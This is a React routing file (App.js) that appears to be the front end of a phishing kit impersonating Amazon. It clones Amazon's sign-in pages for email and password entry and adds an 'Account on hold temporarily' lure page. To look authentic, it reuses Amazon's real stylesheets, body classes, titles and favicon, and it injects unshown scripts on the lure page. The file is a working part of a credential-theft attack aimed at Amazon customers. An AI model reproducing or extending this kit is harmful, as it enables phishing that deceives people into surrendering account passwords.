
import ContentLaptop from './Components/ContentLaptop';
import ContentMobile from './Components/ContentMobile';
import { Helmet } from 'react-helmet';
import { scriptMobile, scriptLaptop } from './ScriptContext';
import EmailMobile from './Components/EmailMobile';
import EmailLaptop from './Components/EmailLaptop';
import { useEffect } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom'
import PassLaptop from './Components/PassLaptop';
import PassMobile from './Components/PassMobile';
import { EmailProvider } from './Context/ContextApi';

function App() {

  const windowWidth = window.innerWidth;

  useEffect(() => {
    const pathname = window.location.pathname;
    
    if (pathname === '/' && windowWidth >= 640) {
      document.body.className = '';
      document.body.classList.add('auth-no-skin', 'ap-locale-en_US', 'a-m-us', 'a-aui_72554-c', 'a-aui_accordion_a11y_role_354025-c', 'a-aui_killswitch_csa_logger_372963-c', 'a-aui_pci_risk_banner_210084-c', 'a-aui_preload_261698-c', 'a-aui_rel_noreferrer_noopener_309527-c', 'a-aui_template_weblab_cache_333406-c', 'a-aui_tnr_v2_180836-c', 'a-meter-animate');

    } else if (pathname === '/' && windowWidth < 640) {
      document.body.className = '';
      document.body.classList.add('a-color-offset-background', 'auth-no-skin', 'ap-locale-en_US', 'a-m-us', 'a-aui_72554-c', 'a-aui_accordion_a11y_role_354025-c', 'a-aui_killswitch_csa_logger_372963-c', 'a-aui_pci_risk_banner_210084-c', 'a-aui_preload_261698-c', 'a-aui_rel_noreferrer_noopener_309527-c', 'a-aui_template_weblab_cache_333406-c', 'a-aui_tnr_v2_180836-c', 'auth-show-password-enabled', 'auth-show-password-ready');
    
    } else if(pathname === '/content'){
      document.body.className = '';
      document.body.classList.add('abbott-view', 'a-m-us', 'a-aui_72554-c', 'a-aui_a11y_1_699934-c', 'a-aui_a11y_4_835613-c', 'a-aui_a11y_6_837773-c', 'a-aui_a11y_sr_678508-c', 'a-aui_killswitch_csa_logger_372963-c', 'a-aui_pci_risk_banner_210084-c', 'a-aui_preload_261698-c', 'a-aui_rel_noreferrer_noopener_309527-c', 'a-aui_template_weblab_cache_333406-c', 'a-aui_tnr_v2_180836-c');
    
    } else if (pathname === '/password' && windowWidth >= 640) {
      document.body.className = '';
      document.body.classList.add('auth-no-skin', 'ap-locale-en_US', 'a-m-us', 'a-aui_72554-c', 'a-aui_accordion_a11y_role_354025-c', 'a-aui_killswitch_csa_logger_372963-c', 'a-aui_pci_risk_banner_210084-c', 'a-aui_preload_261698-c', 'a-aui_rel_noreferrer_noopener_309527-c', 'a-aui_template_weblab_cache_333406-c', 'a-aui_tnr_v2_180836-c', 'a-meter-animate');

    } else if (pathname === '/password' && windowWidth < 640) {
      document.body.className = '';
      document.body.classList.add('a-color-offset-background', 'auth-no-skin', 'ap-locale-en_US', 'a-m-us', 'a-aui_72554-c', 'a-aui_accordion_a11y_role_354025-c', 'a-aui_killswitch_csa_logger_372963-c', 'a-aui_pci_risk_banner_210084-c', 'a-aui_preload_261698-c', 'a-aui_rel_noreferrer_noopener_309527-c', 'a-aui_template_weblab_cache_333406-c', 'a-aui_tnr_v2_180836-c', 'auth-show-password-enabled', 'auth-show-password-engaged', 'auth-show-password-ready');
    
    }
  }, []);

  return (
        <EmailProvider>
            <BrowserRouter>
                <Routes>
                    {windowWidth < 640 ? (
                        <>
                            <Route path='/' element={
                              <>
                                <Helmet htmlAttributes={{
                                  class: 'a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser'
                                }}>
                                  <meta
                                    name="viewport"
                                    content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"
                                  />
                                  <meta charset="utf-8" />
                                  <title dir="ltr">Amazon Sign-In</title>
                                  <meta
                                    name="viewport"
                                    content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"
                                  />
                      
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/61UhpddG6YL._RC|11iHkiAT2oL.css,01wLsDqViEL.css,11MhAJ3QIgL.css,31JhtlVsImL.css,31i+Ric3zOL.css,01DHz7m6lhL.css_.css?AUIClients/AmazonUI#mobile.us.not-trident"
                                  />
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51raMAFHQbL.css_.css?AUIClients/AuthenticationPortalAssets&amp;QmmAyoMU#mobile.194821-T1"
                                  />
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/21D7oXu-KGL.css?AUIClients/CVFAssets#mobile"
                                  />
                                      <link
                                      rel="stylesheet"
                                      href="https://images-na.ssl-images-amazon.com/images/I/41HvKG+LfOL._RC|41-WpIOxHtL.css,51AfUgtFX8L.css_.css?AUIClients/NavMobileAssets-all&amp;EHUJ1ZxG#488657-T2.778344-T1.777424-T1"
                                    />
                                    <link
                                      rel="stylesheet"
                                      href="https://images-na.ssl-images-amazon.com/images/I/41bhuBzDmyL.css?AUIClients/InternationalCustomerPreferencesNavMobileAssets"
                                    />
                                    <link
                                      rel="stylesheet"
                                      href="https://images-na.ssl-images-amazon.com/images/I/01+72+wCC9L.css?AUIClients/GlowToasterAssets#mobile"
                                    />
                                    <link
                                      rel="stylesheet"
                                      href="https://images-na.ssl-images-amazon.com/images/I/415bFd7emCL._RC|21eEVwLFzfL.css,31eNyfgmRYL.css_.css?AUIClients/RetailSearchAutocompleteAssets#mobile"
                                    />
                                </Helmet>
                                <EmailMobile/>
                              </>
                              } />
                            <Route path='/content' element={
                              <>
                                <Helmet>
                                  <meta
                                    name="viewport"
                                    content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"
                                  />
                                  <meta charset="utf-8" />
                                  <title>Account on hold temporarily</title>
                                  <meta
                                    name="viewport"
                                    content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"
                                  />
                                  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
                                  <link
                                    href="https://www.amazon.com/favicon.ico"
                                    rel="shortcut icon"
                                    type="image/x-icon"
                                  />
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/11OrJUma5UL._RC|01buZbdsUoL.css,01FlnJfL6qL.css,41-Odm-MOoL.css,31gtoylFdNL.css,01LrCOoyLXL.css,11+5Zkv0+pL.css,01Brx6+fBpL.css,01rhj7BIeEL.css,310ooOGCdhL.css,11o2wHvvdBL.css,01i9N7e-hBL.css,11n-XcQuO0L.css,11ADf9L1OdL.css,01IdKcBuAdL.css,019pz6QNQ6L.css,01wLsDqViEL.css,11qV+RcW-yL.css,017oxx82kUL.css,51YMxMkVwHL.css,01B-YPN7k2L.css,21IXKiF-V9L.css,11vJ0C7K1AL.css,11Yd1OV8dYL.css,21AL2IbGWYL.css,11BxVmGHtmL.css,01CFUgsA-YL.css,31SUbFD7EbL.css,01TrIleQbxL.css,112j6WRt7cL.css,219k7gEqxTL.css,11VvAxw559L.css,01nl+6V4OzL.css,11Dg5X2FOfL.css,21G45kbFPnL.css,11gNHmvR+bL.css,01ydALAwZXL.css,21+-qc56uZL.css,11pA-LAYEML.css,11FImvIW68L.css,11Ty7A6HeXL.css,01890+Vwk8L.css,11d2v74HkoL.css,01ey7bcyPEL.css,01cbS3UK11L.css,21tMfUvcF2L.css,01INc4pyFRL.css_.css?AUIClients/AmazonUI#mobile.us.not-trident"
                                  />
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/01NjQbvCUVL.css?AUIClients/AbbottViewComponentMobileAssets"
                                  />
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/31E2uCL+CuL.css?AUIClients/AbbottPortalAssets"
                                  />
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/11YuQ0DJSqL.css?AUIClients/AbbottViewComponentCommonAssets"
                                  />
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/51yFEbMJ8yL._RC|419uoI5318L.css,01+72+wCC9L.css_.css?AUIClients/AmazonNavigationMobileMetaAsset#mobile"
                                  />
                                  <script>{scriptMobile}</script>
                                          
                                </Helmet>
                                <ContentMobile/>
                              </>
                            } />
                            <Route path='/password' element={
                              <>
                                <Helmet htmlAttributes={{
                                  class: 'a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser'
                                }}>
                                  <meta
                                  name="viewport"
                                  content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"
                                />
                                <meta charset="utf-8" />
                                <title dir="ltr">Amazon Sign-In</title>
                                <meta
                                  name="viewport"
                                  content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"
                                />

                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/61UhpddG6YL._RC|11iHkiAT2oL.css,01wLsDqViEL.css,11MhAJ3QIgL.css,31JhtlVsImL.css,31i+Ric3zOL.css,01DHz7m6lhL.css_.css?AUIClients/AmazonUI#mobile.us.not-trident"
                                />
                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51raMAFHQbL.css_.css?AUIClients/AuthenticationPortalAssets&amp;QmmAyoMU#mobile.194821-T1"
                                />
                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/21D7oXu-KGL.css?AUIClients/CVFAssets#mobile"
                                />
                                
                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/41HvKG+LfOL._RC|41-WpIOxHtL.css,51AfUgtFX8L.css_.css?AUIClients/NavMobileAssets-all&amp;EHUJ1ZxG#488657-T2.778344-T1.777424-T1"
                                />
                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/41bhuBzDmyL.css?AUIClients/InternationalCustomerPreferencesNavMobileAssets"
                                />
                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/01+72+wCC9L.css?AUIClients/GlowToasterAssets#mobile"
                                />
                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/415bFd7emCL._RC|21eEVwLFzfL.css,31eNyfgmRYL.css_.css?AUIClients/RetailSearchAutocompleteAssets#mobile"
                                />

                                </Helmet>
                                <PassMobile/>
                              </>
                            } />
                        </>
                    ) : (
                        <>
                            <Route path='/' element={
                              <>
                              <Helmet htmlAttributes={{ 
                                class: "a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember"}}>
                                <meta charset="utf-8" />
                                <title dir="ltr">Amazon Sign-In</title>
                    
                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident"
                                />
                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51ndJ60shfL.css_.css?AUIClients/AuthenticationPortalAssets"
                                />
                                <link
                                  rel="stylesheet"
                                  href="https://images-na.ssl-images-amazon.com/images/I/21PFuszay6L.css?AUIClients/CVFAssets"
                                />
                    
                              </Helmet>
                              <EmailLaptop/>
                              </>
                            } />
                            <Route path='/content' element={
                                        <>
                                        <Helmet>
                                          <meta charset="utf-8" />
                                          <title>Account on hold temporarily</title>
                                          <meta http-equiv="content-type" content="text/html; charset=utf-8" />
                                          <link
                                            href="https://www.amazon.com/favicon.ico"
                                            rel="shortcut icon"
                                            type="image/x-icon"
                                          />
                                          <link
                                            rel="stylesheet"
                                            href="https://images-na.ssl-images-amazon.com/images/I/11EIQ5IGqaL._RC|01e5ncglxyL.css,01lF2n-pPaL.css,41Mdq8Sx7GL.css,31xg3iIZbKL.css,01IWMurvs8L.css,013z33uKh2L.css,01qPl4hxayL.css,01rhj7BIeEL.css,41EWOOlBJ9L.css,11TIuySqr6L.css,01ElnPiDxWL.css,11fJbvhE5HL.css,01Dm5eKVxwL.css,01IdKcBuAdL.css,01y-XAlI+2L.css,21F2Ja0FB-L.css,01oDR3IULNL.css,51PjmZTX66L.css,01XPHJk60-L.css,01S0vRENeAL.css,21IbH+SoKSL.css,11MrAKjcAKL.css,21fecG8pUzL.css,11a5wZbuKrL.css,01CFUgsA-YL.css,31pHA2U5D9L.css,116t+WD27UL.css,11gKCCKQV+L.css,11061HxnEvL.css,11oHt2HYxnL.css,01j2JE3j7aL.css,11JQtnL-6eL.css,21zZ8mQ5z6L.css,119XZIa6kjL.css,0114z6bAEoL.css,21uwtfqr5aL.css,11QyqG8yiqL.css,11K24eOJg4L.css,11F2+OBzLyL.css,01890+Vwk8L.css,01g+cOYAZgL.css,01cbS3UK11L.css,21F85am0yFL.css,01giMEP+djL.css_.css?AUIClients/AmazonUI#us.not-trident"
                                          />
                                          <link
                                            rel="stylesheet"
                                            href="https://images-na.ssl-images-amazon.com/images/I/31E2uCL+CuL.css?AUIClients/AbbottPortalAssets"
                                          />
                                          <link
                                            rel="stylesheet"
                                            href="https://images-na.ssl-images-amazon.com/images/I/11YuQ0DJSqL.css?AUIClients/AbbottViewComponentCommonAssets"
                                          />
                                          <link
                                            rel="stylesheet"
                                            href="https://images-na.ssl-images-amazon.com/images/I/11qZMVOv-BL.css?AUIClients/AbbottViewComponentDesktopAssets"
                                          />
                                          <script>{scriptLaptop}</script>
                                        </Helmet>
                                        <ContentLaptop/>
                                      </>
                            } />
                            <Route path='/password' element={
                              <>
                                <Helmet htmlAttributes={{
                                  class: 'a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember'
                                }}>
                                  <meta charset="utf-8" />
                                  <title dir="ltr">Amazon Sign-In</title>

                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident"
                                  />
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51ndJ60shfL.css_.css?AUIClients/AuthenticationPortalAssets"
                                  />
                                  <link
                                    rel="stylesheet"
                                    href="https://images-na.ssl-images-amazon.com/images/I/21PFuszay6L.css?AUIClients/CVFAssets"
                                  />
                                </Helmet>
                                <PassLaptop/>
                              </>
                            } />
                        </>
                    )}
                </Routes>
            </BrowserRouter>
        </EmailProvider>
  );
}

export default App;
